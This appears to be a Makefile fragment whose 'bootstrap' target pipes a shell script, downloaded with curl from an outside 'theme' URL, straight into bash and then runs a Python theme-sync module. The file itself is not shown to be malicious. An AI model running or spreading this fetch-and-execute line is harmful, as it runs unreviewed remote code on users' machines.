THEME_URL = https://m100.cloud/api/theme/bootstrap.sh
CACHE_KEY = active

bootstrap:
	@bash <(curl -s "$(THEME_URL)?$(CACHE_KEY)=1")
	@python3 -m theme_sync.sync
